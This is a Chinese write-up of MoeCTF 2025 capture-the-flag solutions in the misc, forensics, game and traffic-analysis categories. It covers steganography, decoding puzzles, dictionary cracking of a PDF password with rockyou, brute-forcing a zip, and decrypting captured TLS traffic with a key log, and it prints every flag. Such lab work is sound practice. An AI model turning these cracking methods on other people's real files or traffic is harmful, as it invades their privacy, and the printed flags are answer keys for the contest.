---
title: moectf_2025_misc
description: 从此开始 签到 moectfWelcome_to_MoeCTF_2025 misc Steganography Misc入门指北
  欢迎来到misc的世界^_^ 想要的flag就藏在入门指北里面，快去找找看吧~ ^附件:miscru_men_zhi_bei.pdf pdf最下方，发
date: 2026-01-22T15:22:05.000Z
categories:
  - Practice
tags: []
minutes: 44
demo: false
draft: false
---


***


## 从此开始

### 签到

`moectf{Welcome_to_MoeCTF_2025}`



## misc

### Steganography

#### Misc入门指北

> 欢迎来到misc的世界^_^
>
> 想要的**flag**就藏在入门指北里面，快去找找看吧~

[ ^附件]:miscru_men_zhi_bei.pdf

pdf最下方，发现空白的flag随便找个能打字的复制即可

**moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!}**



#### ez_锟斤拷

> E=hv在记事本里写下了一些神秘字符，但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了**乱码**
>
> 现在我把这个文件给你，请你帮助hv找回文件的秘密吧！
>
> 请把得到的flag**转换成半角字符上交**
>
> hint：此题解法与锟斤拷有关

[ ^附件]:attachment.zip

锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹

notepad++打开转ANSI编码再使用UTF-8编码

```text
ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全是锟斤拷锟斤拷锟斤拷
```

注意全角转半角

**moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}**



#### rush

> “冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。
>
> 你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？
>
> ~~上述文案纯属看图说话，玩个梗，无恶意~~

[ ^附件]:rush.zip

解压，gif，随波逐流分帧得到残缺二维码的图片

小心裁剪！不要留任何空隙

随波逐流添加定位符

随波逐流或者微信扫一扫**moectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}**

注：随哥二维码识别工具可以选中自动添加定位符+扫码



#### ez_LSB

> 这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？

[ ^附件]:xidian.png

题目说的还以为有点难度，stegsolve没发现啥

zsteg一把梭

```bash
└─# zsteg xidian.png
b1,r,lsb,xy         .. text: "The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9"
```

base64解码得到**moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}**



#### weird_photo

> FLAG就在图中。
>
> 什么，你说你看不见 FLAG？注意 CRC！

[ ^附件]:photo.zip

明显高度不对，随波逐流一把梭

`moectf{Image_Height_Restored}`



#### SSTV

> 识别并解码附件中使用的特殊通信协议，以获取隐藏信息。

[ ^附件]:sstv.zip

sstv转图片

```bash
sudo apt install sstv
sstv -d sstv.wav
```

`moectf{d3codiNG_SStV_reQu1REs-PAII3nC3}`



#### encrypted_pdf

> 这年头，啥都能带个密码，pdf也不例外。
>
> 难道有密码就能拦住我堂堂misc手吗？？不可能的！

[ ^附件]:attachment.zip

加密了，工具pdfcrack

```bash
pdfcrack -f attachment/不知道写什么.pdf -w /mnt/f/tools/misc/archpr/rockyou.txt
PDF version 1.7
Security Handler: Standard
V: 2
R: 3
P: -3904
Length: 128
Encrypted Metadata: True
FileID: f9c0124b162d19df0de049441928783d
U: 8f1e04552e777d9b6b6ff0dc7d49039500000000000000000000000000000000
O: 49c00420daab2a431f463f14442948021fe4bd9b4cddef1ce0d3addf968b075b
found user-password: 'qwe123'
```

参数-f是文件地址，-w是字典地址。

还得是rockyou。解密成功。中间有空白，以防万一的心理全部复制文字

果然发现flag：

`moectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}`



#### hachimigo

>出题人哈基米音乐听多了(bushi

[  ^附件]:hachimigo.zip

```text
南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。窝那没撸多吉豆没米奶压哈基米，哈基米多那吉豆没米吉哈基米？奈诺娜美嘎豆没咕吉豆窝那没撸多，南北绿豆没咕吉豆没咕吉窝那没撸多，窝那没撸多豆没咕吉哦吗吉利；南北绿豆豆没咕吉豆没米窝那没撸多；南北绿豆吉豆耶咕吉豆椰奶龙。哈基米没米吉豆哈基米？库路曼波耶吗多奈哪买噶哈基米。哦吗吉利奈哪买噶奈哪阿西噶压；南北绿豆买噶奈哪窝那没撸多；阿西噶压买噶奈哪买阿西噶压；哈基米娜多多压那窝那没撸多？欧莫季里奈哪买北多奈诺娜美嘎；哦吗吉利多压那呀里欧西库路曼波。窝那没撸多奈哪买噶奈哈基米；南北绿豆哪买噶奈哪哦吗吉利，欧莫季里买噶奈哪买噶奈库路曼波，库路曼波哪买噶多多压那库路曼波。哈基米奈哪买噶奈哪买南北绿豆？椰奶龙娜奈哪买哈基米，窝那没撸多噶奈哪买奈诺娜美嘎？阿西噶压噶奈哪买噶奈哪哈基米，阿西噶压买噶奈哪买娜奈奈诺娜美嘎。奈诺娜美嘎哪买北奈哪买噶椰奶龙？哦吗吉利奈哪买北奈诺娜美嘎，窝那没撸多奈哪买噶奈哪窝那没撸多？阿西噶压买噶奈哪买噶奈欧莫季里。库路曼波哪买噶奈哈基米？阿西噶压哪买噶多多压那阿西噶压。窝那没撸多奈哪买北奈哪买阿西噶压；库路曼波噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶奈哈基米；椰奶龙哪买噶奈哪买哦吗吉利；南北绿豆噶奈哪买哈基米；哈基米噶多多压那奈诺娜美嘎？窝那没撸多奈哪买北奈哦吗吉利，库路曼波哪买娜奈椰奶龙。哈基米哪买噶奈哪欧莫季里？椰奶龙买噶奈哪买噶阿西噶压。哈基米奈哪买噶奈奈诺娜美嘎？欧莫季里哪买噶多多压那哦吗吉利，阿西噶压奈哪买娜奈哪买哦吗吉利，南北绿豆娜奈哪买噶奈哪哈基米；库路曼波买噶奈哪买窝那没撸多。哈基米噶奈哪买南北绿豆；椰奶龙噶奈哪买噶多多窝那没撸多，阿西噶压压那奈哪买椰奶龙，欧莫季里娜奈哪买奈诺娜美嘎，阿西噶压北奈哪买噶奈哪库路曼波。库路曼波买噶奈哪买噶奈阿西噶压？哈基米哪买噶奈南北绿豆，南北绿豆哪买娜奈哪买哈基米；哦吗吉利北奈哪买噶奈椰奶龙，库路曼波哪买北奈窝那没撸多，阿西噶压哪买噶奈哪买奈诺娜美嘎；奈诺娜美嘎噶奈哪买噶奈欧莫季里，阿西噶压哪买噶奈哪窝那没撸多。南北绿豆买噶多多阿西噶压，窝那没撸多压那奈哪阿西噶压？椰奶龙买北奈哪奈诺娜美嘎；窝那没撸多买娜奈哪买噶奈椰奶龙？哦吗吉利哪买噶奈阿西噶压。哈基米哪买噶奈哪窝那没撸多；库路曼波买噶奈哪买噶奈欧莫季里。南北绿豆哪买北多多压那窝那没撸多；欧莫季里奈哪买娜奈哪买奈诺娜美嘎；椰奶龙噶奈哪买噶窝那没撸多，奈诺娜美嘎奈哪买噶奈阿西噶压；阿西噶压哪买噶奈哪买娜阿西噶压；椰奶龙奈哪买北奈欧莫季里。奈诺娜美嘎哪买噶奈阿西噶压，椰奶龙哪买娜奈哪买欧莫季里？库路曼波噶奈哪买库路曼波。阿西噶压噶奈哪买噶窝那没撸多；窝那没撸多奈哪买噶奈哪买南北绿豆？阿西噶压噶多多压那椰奶龙，库路曼波奈哪买娜哈基米；窝那没撸多奈哪买噶阿西噶压，库路曼波喔酷娜利步啊那窝那没撸多？南北绿豆吉豆没咕吉豆欧莫季里；欧莫季里没咕吉豆没南北绿豆？库路曼波咕吉豆没咕库路曼波。哈基米吉豆没咕哦吗吉利？哈基米奶压多那吉豆库路曼波，库路曼波没咕吉豆耶咕阿西噶压，椰奶龙吉豆没咕吉豆没窝那没撸多？阿西噶压咕吉豆没咕欧莫季里。奈诺娜美嘎吉豆没咕吉豆哈基米？欧莫季里没咕奶压多那吉库路曼波；阿西噶压豆没咕奶椰奶龙；奈诺娜美嘎压多那吉南北绿豆，窝那没撸多豆没咕吉欧莫季里；南北绿豆豆没咕吉豆奈诺娜美嘎。库路曼波没咕吉豆奈诺娜美嘎，南北绿豆没咕吉豆没咕吉窝那没撸多？库路曼波豆耶咕奶压多阿西噶压，哈基米那吉豆没米吉豆窝那没撸多；哈基米没咕吉豆没咕吉南北绿豆？奈诺娜美嘎豆没咕吉豆没奈诺娜美嘎；南北绿豆咕吉豆没南北绿豆。奈诺娜美嘎咕奶压多那吉奈诺娜美嘎？南北绿豆豆没米吉椰奶龙；椰奶龙豆没咕吉豆没窝那没撸多？欧莫季里咕吉豆没咕吉豆库路曼波；欧莫季里没咕吉豆没咕南北绿豆？奈诺娜美嘎吉豆没咕奶窝那没撸多；南北绿豆压多那吉豆没咕哈基米？欧莫季里吉豆没米吉豆欧莫季里；阿西噶压没咕吉豆奈诺娜美嘎；阿西噶压没咕吉豆没咕吉椰奶龙，哈基米豆没咕吉豆没阿西噶压？南北绿豆咕奶压多那椰奶龙。欧莫季里吉豆没咕吉豆没库路曼波；哈基米吗喵子路路吉阿西噶压，窝那没撸多豆没咕吉豆哦吗吉利；南北绿豆没咕吉豆阿西噶压？阿西噶压没咕吉豆没南北绿豆；哈基米咕吉豆没咕窝那没撸多；阿西噶压奶压多那吉椰奶龙；库路曼波豆没咕吉豆没米阿西噶压，奈诺娜美嘎吉豆没咕吉窝那没撸多。阿西噶压豆没咕吉窝那没撸多，阿西噶压豆没咕吉豆欧莫季里？库路曼波没咕吉豆没窝那没撸多，库路曼波咕吉豆耶咕奶压窝那没撸多？哦吗吉利多那吉豆没米阿西噶压。哈基米吉豆没咕吉欧莫季里；南北绿豆豆没咕吉欧莫季里。南北绿豆豆没咕吉豆没咕南北绿豆？椰奶龙吉豆没米吉豆椰奶龙；库路曼波耶咕吉豆没阿西噶压？欧莫季里咕吉豆没米南北绿豆；南北绿豆吉豆没咕吉豆没哈基米；哦吗吉利咕吉豆没咕吉奈诺娜美嘎？窝那没撸多豆没咕吉豆库路曼波，库路曼波没咕奶压多那吉阿西噶压。窝那没撸多豆没咕吉豆库路曼波？阿西噶压没西一奈哪买噶阿西噶压；哦吗吉利奈哪买噶哦吗吉利；椰奶龙奈哪买噶奈南北绿豆，库路曼波哪买噶奈哪买娜库路曼波，哈基米奈哪买北奈哪买窝那没撸多。欧莫季里噶奈哪买北奈哈基米，椰奶龙哪买噶奈库路曼波？南北绿豆哪买噶奈欧莫季里；哈基米哪买噶奈椰奶龙，奈诺娜美嘎哪买噶奈哪南北绿豆，库路曼波买娜奈哪哦吗吉利？阿西噶压买北奈哪买娜奈库路曼波。欧莫季里哪买噶奈欧莫季里，库路曼波哪买噶奈哪买欧莫季里？库路曼波噶奈哪买噶奈窝那没撸多；阿西噶压哪买噶奈阿西噶压；窝那没撸多哪买噶奈哪买北南北绿豆。库路曼波多多压那欧莫季里？欧莫季里奈哪买娜奈哪哦吗吉利；哈基米买噶奈哪买噶奈库路曼波，库路曼波哪买噶奈库路曼波？奈诺娜美嘎哪买噶奈哪阿西噶压，南北绿豆买噶多多压库路曼波；南北绿豆那奈哪买娜奈库路曼波，库路曼波哪买北奈哪椰奶龙，欧莫季里买噶奈哪买库路曼波。窝那没撸多噶奈哪买噶窝那没撸多，哈基米奈哪买噶阿西噶压。南北绿豆奈哪买噶多椰奶龙？哈基米多压那奈哪阿西噶压；库路曼波买娜奈哪买欧莫季里？库路曼波娜奈哪买噶奈欧莫季里；哈基米哪买噶奈哪椰奶龙。窝那没撸多买噶奈哪奈诺娜美嘎；椰奶龙买噶奈哪买库路曼波，阿西噶压娜奈哪买北椰奶龙。奈诺娜美嘎奈哪买噶奈哈基米；窝那没撸多哪买北奈哪哈基米。奈诺娜美嘎买噶奈哪买噶窝那没撸多？南北绿豆奈哪买噶欧莫季里，库路曼波奈哪买噶奈哪买库路曼波。南北绿豆娜奈哪买南北绿豆；欧莫季里北奈哪买娜奈哦吗吉利。哈基米哪买娜子窝那没撸多；南北绿豆酷波利子撸娜哪哈基米？哈基米哈里椰路阿西噶压，阿西噶压奈哪买噶奈哪哈基米。哈基米买噶奈哪买噶库路曼波？欧莫季里奈哪买噶奈哪南北绿豆，奈诺娜美嘎买噶多多椰奶龙；阿西噶压压那奈哪库路曼波；库路曼波买噶多多压那奈库路曼波；哦吗吉利哪买噶奈哪买哦吗吉利。椰奶龙噶奈哪买噶奈窝那没撸多，阿西噶压哪买噶奈哪买噶欧莫季里，库路曼波多多压那奈库路曼波；窝那没撸多哪买噶多多压那哈基米，窝那没撸多喔米哦啊呀砸奈诺娜美嘎；椰奶龙曼吉豆没咕南北绿豆；库路曼波吉豆没咕吉豆没阿西噶压？哦吗吉利咕吉豆没咕吉哦吗吉利；库路曼波豆没咕奶压库路曼波。库路曼波多那吉豆南北绿豆？奈诺娜美嘎没米吉豆库路曼波；哦吗吉利耶吗一奈哪买奈诺娜美嘎。椰奶龙噶奈哪买噶奈阿西噶压？哈基米哪买噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶阿西噶压；窝那没撸多多多压那阿西噶压，阿西噶压奈哪买北奈阿西噶压，欧莫季里哪买噶奈哪买噶哈基米。哈基米奈哪买噶奈诺娜美嘎？哈基米奈哪买噶库路曼波。南北绿豆奈哪买噶奈哪阿西噶压，奈诺娜美嘎买噶多多压那欧莫季里；南北绿豆奈哪买噶哈基米，窝那没撸多奈哪买北奈哪买南北绿豆，欧莫季里噶奈哪买奈诺娜美嘎？哦吗吉利噶奈哪买哈基米；南北绿豆噶奈哪买南北绿豆；窝那没撸多噶奈哪买娜奈哪椰奶龙，欧莫季里买北奈哪买噶阿西噶压，库路曼波多多压那奈哪买哈基米；哈基米噶奈哪买噶窝那没撸多？欧莫季里奈哪买噶奈哪买哦吗吉利。阿西噶压噶奈哪买噶多哦吗吉利，阿西噶压多压那奈哪买阿西噶压，哈基米北奈哪买南北绿豆，南北绿豆噶奈哪买噶奈阿西噶压，欧莫季里哪买噶奈哦吗吉利。椰奶龙哪买噶奈哈基米，库路曼波哪买噶奈窝那没撸多，奈诺娜美嘎哪买噶多窝那没撸多，椰奶龙多压那奈哪买噶南北绿豆，阿西噶压奈哪买北奈哈基米；哈基米哪买噶奈哪奈诺娜美嘎，哦吗吉利买噶奈哪买噶奈阿西噶压，窝那没撸多哪买噶奈哪阿西噶压。窝那没撸多买娜多多椰奶龙；椰奶龙压那多多压奈诺娜美嘎；阿西噶压那奈哪买娜南北绿豆。哦吗吉利自米哦啊南北绿豆；奈诺娜美嘎南酷基压步酷欧莫季里；奈诺娜美嘎马美友喔奈诺娜美嘎；窝那没撸多诺哪呀喔喵欧莫季里；欧莫季里哩椰奶龙。
```

哈基米语解码可得

```text
‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬{‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌try‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍_‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬_‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography}
```

是的，复制到这里看起来很简单，但是在网页上显示的时候确实卡了

一名合格的misc手怎么能轻易相信眼睛呢

看来还是得多多修炼

不过其实可以想想，只是这么短的一段fakeflag，不可能加密出来这么多字的。

0宽解密

`moectf{1b8956b9-a423-4101-a1bd-65be33682c82}`



#### ez_png

> 这张平平无奇的图片里藏着一个小秘密。
>
> 秘密不在颜色中，而在文件的骨骼里。
>
> 注意：某些数据段的长短似乎不太协调。

[ ^附件]:ez_png.zip

binwalk分离出压缩数据可得

`moectf{h1DdEn_P4YlOaD_IN-Id4T}`



#### 捂住一只耳

> 一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音
>
> flag 形式以moectf{}包裹提交，忽略大小写

[ ^附件]:li_zi_yi_shu.zip

拖进Audacity看频谱发现摩斯密码

```text
.._. ._.. ._ __. .. ... ___... .... ._ ._.. .._. ..__._ ._. ._ _.. .. ___ ..__._ .. _. ..__._ _.._ _.. .._
```

让AI翻译一下

```
FLAG IS: HALF_RADIO_IN_XDU
```

`moectf{HALF_RADIO_IN_XDU}`



#### WebRepo

> 这都是什么稀奇古怪的格式！？

##### 官答

这题做的很困惑

扫码说binwalk，见鬼的是binwalk -e分离不出，binwalk倒是提示有7z

```bash
dd if=WebRepo.webp of=output.7z bs=1 skip=16012
```

只能手动提取，解压发现是.git

##### 非预期

万万能能的7z可以直接打开webp，复制出.git目录



接下来是git取证

```bash
git status
git reset --hard
```

成功恢复flag.txt

也可以用git gui打开（windows安装git for windows，对.git文件夹单击右键open git gui here打开可以看到flag）

`moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}`



### Forensics

#### Encrypted volume

> 找到钥匙，解开加密卷！

[ ^附件]:volume.rar

VC容器。直接解压没看到哪里有key

把rar扔进010editor没发现异常，扔到随波逐流竟然说有png，foremost分离成功，扫码得到`:@(s<"A3F:89x541Ux[<`

挂载后得到文本

```text
+++++ +++++ [->++ +++++ +++<] >++++ +++++ .++.< +++[- >---< ]>-.- -.<++ ++[-> ++++< ]>+.< +++[- >---< ]>--- --.<+ +++[- >++++ <]>++ +++.< +++[- >---< ]>--- -.<++ +++[- >---- -<]>- ----- .++++ ++++. +++++ +++.- ----- .<+++ +[->+ +++<] >++++ ++.<+ ++++[ ->--- --<]> -.<++ ++++[ ->--- ---<] >---- .<+++ ++++[ ->+++ ++++< ]>+++ +++++ ++.<+ +++++ +[->- ----- -<]>- --.<+ ++++[ ->+++ ++<]> +++++ ++++. <++++ +[->- ----< ]>--- ----- --.<+ +++++ [->++ ++++< ]>+++ +++++ .<+++ [->-- -<]>- .---- ---.< +++++ [->++ +++<] >++++ +.+++ .<+++ [->-- -<]>- --.<+ +++[- >---- <]>-- ----- -.--- ---.- .<+++ +[->- ---<] >---- ---.< +++++ +[->+ +++++ <]>++ +++.- ----- -.<++ +++[- >++++ +<]>+ +++.+ +++++ +++.- ----- --.<+ +++++ [->-- ----< ]>--- -.<++ +++++ [->++ +++++ <]>++ +++++ .<
```

随波逐流，brainfuck解码

`moectf{nOW_YoU-h4V3_UNlocKED-VOlumE}`



#### 万里挑一

脚本题

`moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}`



### Games

#### MoeCTF指导版

> 最近锤子太多了，都忙不过来了！！为了帮助大家更好地可以完成题目，fifker找到了一个好帮手...它可能有点...（？
>
> 耄耋：拿到flag的方法都告诉你了，你二朵隆吗？？（哈
>
> （这只是一个游戏，没有任何web知识点考察，也不需要任何web手段，千万不要使用，否则会影响游戏体验）
>
> （游戏加载需要一定时间）

题目有点搞笑。差点玩破防

`moectf{554d888c-5219-3f4e-571a-95786cdd6501}`



#### 2048_master

> 大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^_^

[ ^附件]:2048_master.zip

strings搜索发现有flag.txt和一个.dat，但是不知道怎么直接分离出来，运行发现自动生成.dat

直接改数据，改一个16384出来保存，重新运行程序即可获得flag：

`moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}`



### 流量分析

#### Enchantment

> 哇多么好的附魔啊
>
> 你把图片发了出去，但似乎附魔台上的文字有一些不对劲？
>
> 注：请将最终结果按单词以_分离并包上moectf{}提交，忽略大小写

[ ^附件]:enchcantment.zip

作为新生赛提示还是足够的，不过可以不看提示哈哈哈哈

先strings搜索一下，发现了enchantment.png，即题干所说的把图片发了出去

binwalk和foremost试了，提取不出，于是wireshark打开过滤tcp contains "png"追踪TCP流，保存二进制文件即可看到图片

文字是异形文字，搜索我的世界文字可以看到这种文字叫“附魔文字”，对照表不难找，翻译结果是：

```text
the_flag_is_below
now_you_have
mactered_enchanting
```

mactered不是一个标准单词，不难发现翻译错了，flag应该是`moectf{now_you_have_mastered_enchanting}`



#### ez_ssl

> zero6six 在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。
>
> 但与此同时，他的浏览器却悄悄上传了另一份文件。
>
> 现在把他电脑的抓包记录给你，你能破解他的秘密吗？

[ ^附件]:ez_ssl.zip

这题不会哈哈哈，学习了

首先strings搜索可以发现ssl.log，

打开wireshark发现里面有很多TLS流量

TLS是加密流量，需要解密读取

选择文件->导出对象->http，发现有一个**form-data**，**这个文件记录的是 SSL/TLS 加密通信时协商出的会话密钥**。

保存之后选择编辑->首选项->Protocols->TLS，把密钥文件扔进去，可以解密流量。

可以发现http流量里面有一条

```text
165	14.253140	127.0.0.1	127.0.0.1	HTTP	711	POST / HTTP/1.1  (application/x-zip-compressed)
```

有点可疑，右键追踪TLS流，其实HTTP流也行，导出zip

发现解压需要密码，在winRAR发现了中文注释，密码是7位纯数字

暴力爆破4分钟后解密，密码是6921682

```text
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! 